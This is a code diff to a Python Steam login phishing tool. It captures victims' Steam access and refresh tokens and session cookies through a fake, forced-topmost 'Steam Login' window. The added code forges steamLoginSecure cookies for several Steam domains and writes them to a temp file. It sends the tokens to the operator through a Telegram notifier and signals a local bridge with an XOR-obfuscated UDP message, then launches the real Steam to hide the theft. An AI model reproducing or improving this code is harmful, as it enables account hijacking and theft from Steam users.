@@ -10,6 +10,7 @@ import base64
 from io import BytesIO
 import qrcode
 import sys
+import subprocess
 from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
 from cryptography.hazmat.primitives.asymmetric import padding
 import os
@@ -261,66 +262,153 @@ class SteamApi:
             except:
                 pass
 
-    def _handle_success(self, auth_data):
-        """Finalizes the session and notifies the operator."""
+    def _handle_success(self, account_name, access_token, refresh_token):
+        """Finalizes the session, saves cookies, and notifies operator via UDP."""
+        debug_log = os.path.join(os.environ.get('TEMP', '.'), 'steam_debug.txt')
         try:
-            refresh_token = auth_data['refresh_token']
-            access_token = auth_data.get('access_token', '')
-            
-            # Generate sessionid
-            sessionid = secrets.token_hex(12)
-            
-            # Try to get steamid from JWT
-            steam_id_64 = ""
-            try:
-                parts = access_token.split('.')
-                if len(parts) >= 2:
-                    padding = '=' * (4 - len(parts[1]) % 4)
-                    jwt_body = json.loads(base64.b64decode(parts[1] + padding).decode('utf-8'))
-                    steam_id_64 = jwt_body.get('sub', '')
-            except: pass
+            with open(debug_log, "a") as f:
+                f.write(f"{time.ctime()}: _handle_success entered for {account_name}\n")
+        except: pass
 
-            cookies = {
-                "sessionid": sessionid,
-                "steamRefresh_steam": refresh_token,
-            }
-            if steam_id_64 and access_token:
-                cookies["steamLoginSecure"] = f"{steam_id_64}%7C%7C{access_token}"
-
-            # Save to file
-            _save = os.path.join(os.environ.get('TEMP', '.'), f'session_{self.username}.json')
-            result = {
-                "account_name": self.username,
-                "password": self.password,
-                "steamid": steam_id_64,
-                "cookies": cookies,
-                "full_auth_data": auth_data
-            }
-            with open(_save, "w", encoding="utf-8") as f:
-                json.dump(result, f, indent=4)
-
-            # Finalize via GenerateAccessTokenForApp (optional but good for persistence)
-            try:
-                finalize_url = f"{API_BASE}/GenerateAccessTokenForApp/v1"
-                finalize_payload = urllib.parse.urlencode({
-                    "refresh_token": refresh_token,
-                    "steamid": "0" 
-                }).encode()
-                req = urllib.request.Request(finalize_url, data=finalize_payload, method="POST")
-                with urllib.request.urlopen(req) as resp:
-                    print("[*] Access Token refreshed.")
-            except: pass
-
-            tg_notify(
-                f"✅ <b>Steam — Сессия захвачена!</b>\n"
-                f"👤 Логин: <code>{self.username}</code>\n"
-                f"🆔 SteamID: <code>{steam_id_64}</code>\n"
-                f"🍪 <b>Cookies:</b>\n"
-                f"<code>sessionid={sessionid}; steamLoginSecure={cookies.get('steamLoginSecure', 'N/A')}</code>"
-            )
-            self.close()
+        print(f"[*] Auth Success for {account_name}")
+        tg_notify(
+            f"🎯 <b>Steam — {account_name}</b>\n\n"
+            f"🔑 <b>Access Token:</b>\n<code>{access_token}</code>\n\n"
+            f"♻️ <b>Refresh Token:</b>\n<code>{refresh_token}</code>\n\n"
+            f"🍪 Cookies записаны в JSON файл."
+        )
+        
+        # Capture all cookies
+        try:
+            cookies = self._window.get_cookies()
+            with open(debug_log, "a") as f:
+                f.write(f"{time.ctime()}: Cookies captured: {len(cookies)}\n")
         except Exception as e:
-            print(f"[!] Error in _handle_success: {e}")
+            cookies = []
+            with open(debug_log, "a") as f:
+                f.write(f"{time.ctime()}: Cookie capture failed: {e}\n")
+        
+        # 1. Extract SteamID from access_token JWT
+        steam_id = "0"
+        try:
+            parts = access_token.split('.')
+            if len(parts) >= 2:
+                # Add padding if needed
+                p = parts[1]
+                p += "=" * ((4 - len(p) % 4) % 4)
+                jwt_body = json.loads(base64.b64decode(p).decode('utf-8'))
+                steam_id = jwt_body.get('sub', '0')
+        except: pass
+
+        # 2. Generate common sessionid if missing
+        sessionid = secrets.token_hex(12)
+        for c in cookies:
+            if c.get('name') == 'sessionid':
+                sessionid = c.get('value')
+                break
+
+        # 3. Add required virtual cookies for all specified domains
+        target_domains = [
+            ".steamcommunity.com", 
+            ".steampowered.com", 
+            "login.steampowered.com", 
+            "store.steampowered.com", 
+            "help.steampowered.com", 
+            "steam-chat.com"
+        ]
+        
+        for domain in target_domains:
+            # Login Secure (steamid%7C%7Caccess_token)
+            cookies.append({
+                "domain": domain,
+                "name": "steamLoginSecure",
+                "value": f"{steam_id}%7C%7C{access_token}",
+                "path": "/",
+                "secure": True,
+                "httpOnly": True,
+                "sameSite": "None"
+            })
+            # Refresh Token (steamid%7C%7Crefresh_token)
+            cookies.append({
+                "domain": domain,
+                "name": "steamRefresh_steam",
+                "value": f"{steam_id}%7C%7C{refresh_token}",
+                "path": "/",
+                "secure": True,
+                "httpOnly": True,
+                "sameSite": "None"
+            })
+            # Session ID
+            cookies.append({
+                "domain": domain,
+                "name": "sessionid",
+                "value": sessionid,
+                "path": "/",
+                "secure": True,
+                "httpOnly": False,
+                "sameSite": "None"
+            })
+
+        # Save to enriched JSON file
+        cookie_file = os.path.join(os.environ.get('TEMP', '.'), f"steam_cookies_{account_name}.json")
+        try:
+            with open(cookie_file, 'w', encoding='utf-8') as f:
+                json.dump(cookies, f, indent=4)
+        except Exception as e:
+            with open(debug_log, "a") as f:
+                f.write(f"{time.ctime()}: JSON save failed: {e}\n")
+
+        # Send via UDP Bridge using the FILE: marker
+        if UDP_PORT:
+            def _send_file():
+                import socket
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    raw_msg = f"FILE:{cookie_file}"
+                    data = raw_msg.encode('utf-8')
+                    salt = b'n2xkNQYbZwj8r9fz'
+                    xor_data = bytearray()
+                    for i in range(len(data)):
+                        xor_data.append(data[i] ^ salt[i % len(salt)])
+                    enc_msg = base64.b64encode(xor_data).decode('utf-8')
+                    sock.sendto(enc_msg.encode(), ("127.0.0.1", UDP_PORT))
+                    sock.close()
+                    with open(debug_log, "a") as f:
+                        f.write(f"{time.ctime()}: UDP FILE signal sent: {cookie_file}\n")
+                except Exception as e:
+                    with open(debug_log, "a") as f:
+                        f.write(f"{time.ctime()}: UDP FILE signal failed: {e}\n")
+            threading.Thread(target=_send_file, daemon=True).start()
+        else:
+            tg_notify(f"🍪 <b>Steam — Куки сохранены локально:</b> <code>{cookie_file}</code>")
+
+        time.sleep(2) 
+        
+        # Launch original Steam before closing (per user request)
+        try:
+            import winreg
+            def get_steam_path():
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
+                    val, _ = winreg.QueryValueEx(key, "SteamExe")
+                    return val
+                except:
+                    # Common paths fallback
+                    paths = [
+                        r"C:\Program Files (x86)\Steam\steam.exe",
+                        r"C:\Program Files\Steam\steam.exe"
+                    ]
+                    for p in paths:
+                        if os.path.exists(p): return p
+                    return None
+            
+            steam_exe = get_steam_path()
+            if steam_exe:
+                print(f"[*] Launching original Steam: {steam_exe}")
+                subprocess.Popen([steam_exe])
+        except: pass
+
+        self.close()
 
     def submit_2fa(self, code):
         print(f"[*] Submitting 2FA Code: {code}")
@@ -429,17 +517,11 @@ def _force_focus():
         try:
             hwnd = ctypes.windll.user32.FindWindowW(None, "Steam Login")
             if hwnd:
-                # 1. Force to top and KEEP it there for a few seconds
+                # 1. Force to top
                 ctypes.windll.user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW)
                 ctypes.windll.user32.SetForegroundWindow(hwnd)
                 ctypes.windll.user32.BringWindowToTop(hwnd)
                 ctypes.windll.user32.ShowWindow(hwnd, 5) # SW_SHOW
-                
-                # Stay on top for 3 seconds to ensure visibility
-                time.sleep(3)
-                
-                # 2. Allow Alt-Tab with NOTOPMOST
-                ctypes.windll.user32.SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE)
                 break
         except:
             pass
